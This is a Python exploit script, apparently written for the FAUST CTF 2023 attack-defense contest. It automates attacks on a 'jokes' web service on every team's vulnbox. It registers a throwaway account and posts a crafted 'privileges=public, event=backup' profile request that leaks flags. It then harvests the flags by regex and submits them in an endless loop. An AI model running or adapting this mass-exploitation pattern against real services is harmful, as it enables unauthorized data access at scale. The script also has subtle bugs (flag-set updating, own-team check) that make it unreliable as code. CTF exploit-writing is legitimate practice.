#!/usr/bin/env python3
from pwn import *
import requests
import re
import functools

YEAR = 2023
TEAM_NUMBER = 48
SERVICE_NAME = 'jokes'
SERVICE_PORT = 5000

FLAG_FORMAT = r'FAUST_[A-Za-z0-9\/+]{32}'
TEAMS_URL = f'https://{YEAR}.faustctf.net/competition/teams.json'
OWN_ADDRESS = f'fd66:666:{TEAM_NUMBER}::2'
OWN_NUM = f'fd66:666:{48}::2'
SUBMISSION_URL = 'submission.faustctf.net'
SUBMISSION_PORT = 666

# exploit dependent variables
context.log_level = 'INFO' # 'DEBUG' | 'INFO' | 'CRITICAL'
context.timeout = 2
context.arch = 'amd64'

all_flags = set()

# @all_flags: previously submitted flags
# @current_flags: flags acquired in the current round
# @return an updated set of previously submitted flags
def submit_flags(all_flags, current_flags):
    with remote(SUBMISSION_URL, SUBMISSION_PORT) as p:
        flags = current_flags - all_flags
        print(p.recvline())
        print(p.recvline())
        print(p.recvline())
        for flag in flags:
            p.sendline(flag)
            resp = p.recvline().strip()
            success(f"{flag} - {resp}")
            all_flags.update(flag)
    return all_flags

# @return: list of target IPs as strings
def get_targets():
    targets = requests.get(TEAMS_URL).json()
    # based on FAUST2021
    # TODO: update IP format string
    target_nums = targets["teams"]
    #flag_ids = targets["flag_ids"][SERVICE_NAME]
    return target_nums, []

def parse(flagid):
    return flagid.split(" ")[-1]

def random_string(N):
    return ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(N))

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# @terget_ip: The address of a machine to exploit
# @flag_ids: All flag IDs returned by the API
# @return: set() of flags acquired
def pwn(target_num, flag_ids):
    flags = set()
    #target_flag_ids = flag_ids[str(target_num)]
    vulnbox_ip = f"fd66:666:{target_num}::2"
    username = random_string(10)
    password = "asd"
    s = requests.session()
    s.request = functools.partial(s.request, timeout=3)
    register = s.post(f'http://[{vulnbox_ip}]:{SERVICE_PORT}/register', data = {'name': username, 'password': password})
    login = s.post(f'http://[{vulnbox_ip}]:{SERVICE_PORT}/login', data={'name': username, 'password': password})

    r = s.post(f"http://[{vulnbox_ip}]:5000" + '/profile', data={'privileges': 'public', 'event': 'backup'})
    t = r.text

    # get the flag using FLAG_FORMAT regex
    print(t)
    flags = set(re.findall(FLAG_FORMAT, t))
    #flags.add(flag)
    info(f'Got flag: {flags}')
    return flags


def main():
    target_nums, flag_ids = get_targets()
    target_nums = target_nums
    random.shuffle(target_nums)
    global all_flags
    while True:
        for target in target_nums:
            if target == OWN_NUM:
               continue
            info(f'Attacking: {target}')
            try:
                flags = pwn(target, flag_ids)
            except Exception as e:
                log.critical(f'{e}')
                continue

            # submit flags and update acquired flags
            all_flags = submit_flags(all_flags, flags)


if __name__ == '__main__':
    main()
